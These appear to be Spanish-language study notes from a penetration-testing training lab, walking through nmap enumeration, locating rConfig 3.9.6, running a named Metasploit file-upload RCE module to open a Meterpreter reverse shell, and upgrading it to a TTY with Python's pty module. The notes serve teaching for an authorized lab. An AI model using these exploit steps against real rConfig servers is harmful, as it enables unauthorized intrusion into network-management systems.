
## 1. Enumeración inicial

Realizar un escaneo inicial para identificar servicios, versiones y posibles puntos de entrada.

```
nmap -sC -sV <IP>
```

### Información que debemos identificar

- **Puertos abiertos:** permiten identificar los servicios expuestos.
    
- **Versiones:** pueden revelar software vulnerable.
    
- **Sistema operativo:** ayuda a orientar la búsqueda de vulnerabilidades.
    
- **Aplicaciones web:** pueden contener vulnerabilidades que permitan ejecutar comandos o conseguir una shell.
    
- **Función del servidor:** puede ayudar a identificar su importancia dentro de la red y posibles oportunidades de pivoting.
    

### Ejemplo de servicios interesantes

|Puerto|Servicio|Posible línea de investigación|
|---|---|---|
|21|FTP|Acceso, configuración y versión del servicio|
|22|SSH|Acceso remoto y versión de OpenSSH|
|80|HTTP|Aplicaciones web|
|443|HTTPS|Aplicaciones web cifradas|
|111|RPC|Servicios RPC expuestos|
|3306|MySQL|Base de datos y configuración de acceso|

Ejemplo de tecnologías detectadas:

- Apache `2.4.6`
    
- PHP `7.2.34`
    
- CentOS
    
- MySQL
    

**Importante:** las versiones identificadas son pistas para investigar; no demuestran por sí solas que un servicio sea vulnerable.

## 2. Identificar aplicaciones vulnerables

Después del escaneo, acceder a la aplicación web desde el navegador para identificar el software que utiliza.

En el ejemplo del módulo encontramos **rConfig 3.9.6**, una aplicación de gestión de configuraciones de dispositivos de red.

### Buscar vulnerabilidades

Investigar la aplicación y su versión para localizar:

- CVE conocidos.
    
- Exploits públicos.
    
- Pruebas de concepto (PoC).
    
- Módulos disponibles en Metasploit.
    

Ejemplo de búsqueda:

```
rConfig 3.9.6 vulnerability
```

También podemos buscar módulos de Metasploit:

```
rConfig 3.9.6 exploit metasploit github
```

La versión concreta de la aplicación es importante porque un exploit puede funcionar únicamente en determinadas versiones.

---

## 3. Buscar exploits en Metasploit

Iniciar Metasploit:

```
msfconsole
```

Buscar módulos relacionados con la aplicación:

```
search rconfig
```

En el ejemplo del módulo aparecen, entre otros, estos exploits:

```
exploit/linux/http/rconfig_ajaxarchivefiles_rce
exploit/unix/webapp/rconfig_install_cmd_exec
```

El módulo utilizado en el ejercicio es:

```
exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

**Nota:** el módulo puede no estar disponible en todas las instalaciones de Metasploit.

### Localizar los módulos instalados

```
locate exploits
```

En Pwnbox, la ruta indicada en el módulo es:

```
/usr/share/metasploit-framework/modules/exploits
```

Para el exploit del ejemplo, el directorio correspondiente sería:

```
/usr/share/metasploit-framework/modules/exploits/linux/http/
```

Los módulos de Metasploit están escritos en Ruby y utilizan la extensión `.rb`.

Si un módulo no aparece en la búsqueda, puede ser necesario localizar su código fuente y comprobar su compatibilidad con la versión instalada de Metasploit antes de incorporarlo.

## 4. Explotar rConfig y obtener una shell

Seleccionar el módulo:

```
use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

Consultar las opciones:

```
show options
```

Configurar los parámetros necesarios según el entorno del laboratorio y ejecutar el exploit:

```
exploit
```

El ejemplo del módulo muestra el siguiente proceso:

1. Comprueba la versión de rConfig.
    
2. Detecta que la versión es vulnerable.
    
3. Se autentica en la aplicación web.
    
4. Sube un archivo PHP que contiene el payload.
    
5. Ejecuta el payload para establecer una conexión inversa.
    
6. Elimina el archivo PHP subido.
    
7. Abre una sesión de Meterpreter.
    

Salida representativa:

```
[+] 3.9.6 of rConfig found !
[+] The target appears to be vulnerable.
[+] We successfully logged in !
[*] Uploading file containing the payload...
[*] Triggering the payload ...
[+] Deleted payload file
[*] Meterpreter session 1 opened
```

Si el exploit tiene éxito, obtendremos una sesión de Meterpreter.

## 5. Interactuar con Meterpreter

Una vez establecida la sesión, podemos consultar el contenido del directorio actual:

```
meterpreter > dir
```

Para acceder a una shell del sistema operativo:

```
meterpreter > shell
```

Desde ella podremos ejecutar comandos del sistema, por ejemplo:

```
whoami
ls
```

En el laboratorio, el proceso vulnerable se ejecuta como el usuario `apache`, por lo que la shell obtenida utiliza esa cuenta.

**Conseguir una shell no significa obtener privilegios de root.** El usuario inicial puede tener permisos limitados.

## 6. Shell no interactiva y shell TTY

### Shell no-TTY

Una shell no-TTY puede permitir ejecutar comandos, pero carecer de un terminal interactivo completo.

Entre sus limitaciones pueden encontrarse:

- Ausencia de un prompt normal.
    
- Interacción limitada con determinados programas.
    
- Problemas al utilizar herramientas que requieren un terminal.
    
- Dificultades al interactuar con programas como `su` o `sudo`.
    

### Comprobar si Python está disponible

```
which python
```

### Generar una shell interactiva mediante Python

Si Python está instalado, ejecutar:

```
python -c 'import pty; pty.spawn("/bin/sh")'
```

Ejemplo:

```
sh-4.2$ whoami
apache
```

El módulo `pty` permite generar una shell con un prompt más interactivo mediante `/bin/sh`.

**Importante:** obtener una TTY mejora la interacción con el sistema, pero no eleva los privilegios del usuario.

## 7. Metodología práctica

Flujo de trabajo para investigar una aplicación vulnerable en Linux:

1. **Enumerar:** identificar puertos, servicios y versiones mediante Nmap.
    
2. **Identificar:** acceder a la aplicación web y averiguar qué software utiliza.
    
3. **Investigar:** buscar vulnerabilidades asociadas a la versión detectada.
    
4. **Localizar un exploit:** comprobar si existe un módulo compatible en Metasploit o una PoC pública.
    
5. **Revisar el módulo:** comprender sus requisitos y opciones.
    
6. **Explotar:** ejecutar el módulo en el laboratorio autorizado.
    
7. **Obtener acceso:** comprobar si se ha establecido una sesión de Meterpreter.
    
8. **Interactuar:** abrir una shell del sistema y ejecutar comandos.
    
9. **Mejorar la shell:** generar una TTY si es necesario.
    
10. **Enumerar el contexto:** comprobar el usuario actual y sus permisos antes de investigar posibles vías de escalada de privilegios.

## 9. Ideas clave para el examen

- **Nmap** permite identificar servicios, versiones y posibles puntos de entrada.
    
- Una versión de software identificada puede servir para buscar CVE, exploits y PoC.
    
- **Metasploit** permite buscar, configurar y ejecutar módulos de explotación.
    
- Algunos módulos pueden no aparecer en la búsqueda de la versión instalada.
    
- Un exploit puede aprovechar una vulnerabilidad de una aplicación web para subir y ejecutar un payload.
    
- Una **reverse shell** establece una conexión desde el objetivo hacia la máquina atacante.
    
- **Meterpreter** permite interactuar con el sistema comprometido y abrir una shell.
    
- Una shell no-TTY puede tener limitaciones de interacción.
    
- Python y `pty.spawn()` pueden utilizarse para obtener una shell más interactiva.
    
- El usuario que ejecuta el servicio vulnerable determina los privilegios iniciales de la sesión.
    
- **Shell interactiva no equivale a privilegios elevados:** hay que comprobar siempre el usuario y sus permisos.
